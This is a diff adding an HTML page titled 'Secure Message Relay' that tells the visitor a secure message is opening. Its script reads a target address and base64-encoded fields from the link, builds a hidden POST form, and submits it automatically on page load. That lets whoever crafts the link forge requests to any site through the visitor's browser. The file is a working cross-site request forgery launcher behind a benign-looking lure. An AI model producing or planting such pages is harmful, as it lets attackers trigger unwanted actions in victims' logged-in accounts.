@@ -1,0 +1,58 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Secure Message Relay</title>
+<style>
+  body { font-family: system-ui, sans-serif; padding: 24px; }
+  .box { max-width: 680px; margin: 4rem auto; text-align: center; }
+  button { padding: .7rem 1rem; font-weight: 600; }
+</style>
+<div class="box">
+  <h1>Opening your secure message…</h1>
+  <p>If nothing happens, click the button:</p>
+  <p><button id="go">Continue</button></p>
+</div>
+<script>
+  const qp = new URL(location.href).searchParams;
+  const actionParam = qp.get('a') || '';
+  const bodyParam   = qp.get('b') || '';
+
+  // decode b64 (URI-safe) → UTF-8
+  function b64decodeUtf8(s) {
+    try {
+      return decodeURIComponent(escape(atob(decodeURIComponent(s))));
+    } catch (e) {
+      try { return decodeURIComponent(escape(atob(s))); } catch(e2) { return ''; }
+    }
+  }
+
+  function buildAndSubmit() {
+    const action = decodeURIComponent(actionParam);
+    const body   = b64decodeUtf8(bodyParam);
+
+    if (!action || !body) {
+      alert('Missing data to open the secure message.');
+      return;
+    }
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = action;
+
+    body.split('&').forEach(kv => {
+      if (!kv) return;
+      const [k, v=''] = kv.split('=');
+      const input = document.createElement('input');
+      input.type  = 'hidden';
+      input.name  = decodeURIComponent(k);
+      input.value = decodeURIComponent(v);
+      form.appendChild(input);
+    });
+
+    document.body.appendChild(form);
+    form.submit();
+  }
+
+  document.getElementById('go').addEventListener('click', buildAndSubmit);
+  // auto-submit on load
+  window.addEventListener('load', buildAndSubmit);
+</script>
